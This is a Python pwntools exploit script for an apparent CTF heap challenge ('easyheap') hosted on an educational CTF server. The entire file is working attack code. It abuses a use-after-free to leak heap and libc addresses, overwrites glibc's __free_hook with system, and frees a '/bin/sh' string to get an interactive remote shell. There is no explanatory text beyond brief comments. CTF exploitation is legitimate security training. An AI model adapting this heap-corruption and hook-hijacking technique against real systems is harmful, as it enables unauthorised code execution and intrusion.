from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./easyheap')
r = remote('edu-ctf.zoolab.org', 30211)

def add(idx, nlen, name):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Index: ', str(idx))
    r.sendlineafter("Length of name: ", str(nlen))
    r.sendafter('Name:', name)
    r.sendlineafter('Price: ', '1')

def delete(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('Which book do you want to delete: ', str(idx))

def get_name(idx):
    r.sendlineafter('> ', '5')
    r.sendlineafter('Index: ', str(idx))

def edit(idx, name):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Which book do you want to edit: ', str(idx))
    r.sendafter('Name:', name)
    r.sendlineafter('Price: ', '1')

# Leak heap addr
add(0, 0x10, 'dummy0 ')
add(1, 0x10, 'dummy1 ')
add(2, 0x10, 'dummy2 ')
delete(0)
delete(1)
delete(2)
get_name(2)
r.recvuntil('Name: ')
heap = u64(r.recv(6).ljust(8, b'\x00')) - 0x2a0
unsorted_bin_addr = heap + 0x390
print(hex(heap))

# Leak libc addr
add(3, 0x28, p64(unsorted_bin_addr)) # books[3].name = books[1]
add(9, 0x410, 'unsorted bin ')
add(10, 0x410, 'unsorted bin2 ')
delete(9)
get_name(1)
r.recvuntil('Name: ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
__free_hook = libc + 0x1eeb28
system = libc + 0x55410
print(hex(libc))
print(hex(__free_hook))

# hijack __freehook
edit(3, p64(__free_hook))
edit(1, p64(system))
edit(3, b'/bin/sh\x00')
delete(1)

r.interactive()
